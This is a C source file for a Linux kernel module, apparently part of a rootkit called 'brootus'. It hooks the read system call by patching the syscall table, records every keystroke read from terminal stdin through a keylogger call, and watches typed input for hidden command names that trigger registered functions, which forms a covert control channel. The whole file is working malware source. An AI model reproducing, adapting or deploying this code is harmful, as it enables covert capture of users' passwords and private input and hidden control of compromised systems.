#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/fdtable.h>
#include <linux/sched.h>
#include <linux/dcache.h>
#include <linux/fs.h>
#include <asm/uaccess.h>

#include "load_magic.h"
#include "syscall.h"
#include "keylogger.h"
#include "vt_channel.h"

// Commands
struct command commands[CMD_LENGTH];
int commands_len = 0;

// VT buffers
struct vt_buffer* buffers;
spinlock_t buffers_lock;

// Lock for the VT buffers
extern spinlock_t buffers_lock;

// Saved READ system call
asmlinkage long (*original_read)(unsigned int fd, char __user *buf, size_t count);

// Add a new command
void add_command(char* name, void (*f)(char*))
{
  // Clone the name
  int len = strlen(name);
  char* name_copy = kmalloc(len + 1, GFP_KERNEL);
  strcpy(name_copy, name);

  commands[commands_len].name = name_copy;
  commands[commands_len].f = f;

  commands_len++;
}

// Set the name of a VT buffer struct
void set_vt_name(struct vt_buffer* buffer, const char* vt_name, int vt_name_length)
{
  buffer->vt = kmalloc(vt_name_length + 1, GFP_KERNEL);
  memcpy(buffer->vt, vt_name, vt_name_length);
  buffer->vt[vt_name_length] = '\0';
}

// Find the VT buffer struct of a specified VT name
// Create a new one if it can't be found
struct vt_buffer* find_vt_buffer(const char* vt_name, int vt_name_length)
{
  struct vt_buffer* cur;
  spin_lock(&buffers_lock);
  list_for_each_entry(cur, &buffers->list, list) {
    if (strcmp(vt_name, cur->vt) == 0) {
      spin_unlock(&buffers_lock);
      return cur;
    }
  }
  // Not found. Create a new list entry
  cur = kmalloc(sizeof(struct vt_buffer), GFP_KERNEL);
  cur->buffer_pos = 0;
  set_vt_name(cur, vt_name, vt_name_length);
  list_add(&cur->list, &buffers->list);
  spin_unlock(&buffers_lock);

  return cur;
}

// Initialize the VT buffer list
void init_vt_buffers(void)
{
  buffers_lock = SPIN_LOCK_UNLOCKED;
  buffers = kmalloc(sizeof(struct vt_buffer), GFP_KERNEL);
  INIT_LIST_HEAD(&buffers->list);
}

// Some basic backspace handling on a VT buffer
void handle_backspaces(struct vt_buffer* vtbuf)
{
  char* c;
  char* end = vtbuf->buffer + vtbuf->buffer_pos;

  for (c = vtbuf->buffer + 1; c != end; c++) {
    if (*c == 0x7f && c != vtbuf->buffer) { // We hit a backspace
      // Calculate the length of the rest of the buffer
      int len = end - (c + 1);

      // Delete the backspace and the preceding character
      memmove(c - 1, c + 1, len);

      // Adjust the position variables
      vtbuf->buffer_pos -= 2;
      end -= 2;
      c -= 2;
    }
  }
}

// Return the basename of the file connected to STDIN
const char* stdin_file_name(void)
{
  const char* name;
  char* result = NULL;
  struct files_struct* files;
  struct fdtable* fdt;
  struct file* fd_stdin;
  struct dentry* dentry_stdin;
  struct inode* inode_stdin;

  rcu_read_lock();
  files = rcu_dereference(current->files);

  spin_lock(&files->file_lock);
  fdt = files_fdtable(files);

  // Go along the data structures until we get the inode connected to STDIN
  fd_stdin = rcu_dereference(fdt->fd[0]);
  if (fd_stdin == NULL) {
    goto exit;
  }

  dentry_stdin = rcu_dereference(fd_stdin->f_dentry);
  if (dentry_stdin == NULL) {
    goto exit;
  }

  inode_stdin = rcu_dereference(dentry_stdin->d_inode);
  if (inode_stdin == NULL) {
    goto exit;
  }

  // Return NULL if the file connected to STDIN
  // is not a character device
  if (!S_ISCHR(dentry_stdin->d_inode->i_mode)) {
    goto exit;
  }

  name = rcu_dereference(dentry_stdin->d_name).name;
  result = kmalloc(strlen(name), GFP_KERNEL);
  strcpy(result, name);

  exit:
  rcu_read_unlock();
  spin_unlock(&files->file_lock);
  return result;
}

// Execute the commands found in the given VT buffer
int handle_commands(struct vt_buffer* vtbuf)
{
  int result = 0;
  char* pos;
  int i;

  // Handle backspaces
  handle_backspaces(vtbuf);

  // Make the buffer a C string in order to use strstr
  vtbuf->buffer[vtbuf->buffer_pos] = '\0';

  for (i = 0; i < commands_len; i++) {
    struct command* cmd = &commands[i];
    int name_len = strlen(cmd->name);

    // Search for the command name
    pos = strstr(vtbuf->buffer, cmd->name);

    if (pos != NULL && *(pos+name_len) == '(') {
      char* arg_begin = pos + name_len + 1;
      char* arg_end = strstr(arg_begin, ")");

      if (arg_end != NULL) {
        // Extract the argument
        char* argument = kmalloc(arg_end - arg_begin + 1, GFP_KERNEL);
        char* ap = argument;
        char* c = arg_begin;
        for (; c != arg_end; ap++, c++) {
          *ap = *c;
        }
        *ap = '\0';

        // Invoke the function
        cmd->f((char*) argument);
        kfree(argument);

        // Clear the buffer
        // (So only one keyword in the buffer is recognized which should
        //  be OK because VTs read only 1 character from STDIN at once)
        vtbuf->buffer_pos = 0;

        result++;
      }
    }
  }
  return result;
}

long read_stdin(unsigned int fd, char __user *buf, size_t count, long ret)
{
  const char* vt_name;
  int vt_name_length;
  struct vt_buffer* vtbuf;

  long num_read = ret; // Bytes read by the original call
  int err;
  int user_buffer_pos = 0;

  // Get the current VT name
  vt_name = stdin_file_name();

  // Return early if we don't deal with a character
  // device
  if (vt_name == NULL) {
    return ret;
  }

  // Find or create the corresponding VT buffer
  vt_name_length = strlen(vt_name);
  vtbuf = find_vt_buffer(vt_name, vt_name_length);
  kfree(vt_name);

  while (num_read > 0) {
    // max(num_read, BUFFER_LENGTH)
    int read_len = num_read;
    if (num_read > VT_BUFFER_LENGTH) {
      read_len = VT_BUFFER_LENGTH;
    }

    // Copy the buffer content from userspace to kernel space
    err = copy_from_user(vtbuf->buffer + vtbuf->buffer_pos, buf + user_buffer_pos, read_len);
    if (err) {
        return ret; // Panic
    }

    // Log the keystokes
    log_keys(vtbuf->vt, vtbuf->buffer + vtbuf->buffer_pos, read_len);

    num_read -= read_len;
    user_buffer_pos += read_len;
    vtbuf->buffer_pos += read_len;

    handle_commands(vtbuf);
  }

  return ret;
}

// Our hooked read (modified to build a covert channel)
asmlinkage long brootus_read(unsigned int fd, char __user *buf, size_t count)
{
  // Call the original function
  long ret = original_read(fd, buf, count);

  // Check if our module was unloaded in the meantime
  if (!check_load_magic()) {
    return ret;
  }

  // Return immediately if no data was read
  if (ret <= 0) {
    return ret;
  }

  // For reads from STDIN
  if (fd == 0) {
    ret = read_stdin(fd, buf, count, ret);
  }

  return ret;
}

void free_vt_buffers(void)
{
  struct vt_buffer* cur;
  struct list_head* next;

  spin_lock(&buffers_lock);
  next = buffers->list.next;

  while (next != &buffers->list) {
    // Get the VT buffer
    cur = container_of(next, struct vt_buffer, list);

    // Save the next pointer
    next = cur->list.next;

    // Free memory for the vt name
    kfree(cur->vt);

    // Free the vt_buffer struct
    kfree(cur);
  }

  // Free the list head
  kfree(buffers);
  spin_unlock(&buffers_lock);
}

void free_commands(void)
{
  int i;
  for (i = 0; i < commands_len; i++) {
    kfree(commands[i].name);
  }
  commands_len = 0;
}

void init_vt_channel(void)
{
  init_vt_buffers();

  // Hook the READ system call
  syscall_table_modify_begin();
  HOOK_SYSCALL(read);
  syscall_table_modify_end();
}

void finalize_vt_channel(void)
{
  // Restore the syscall table
  syscall_table_modify_begin();
  RESTORE_SYSCALL(read);
  syscall_table_modify_end();

  // Free memory
  free_vt_buffers();
  free_commands();
}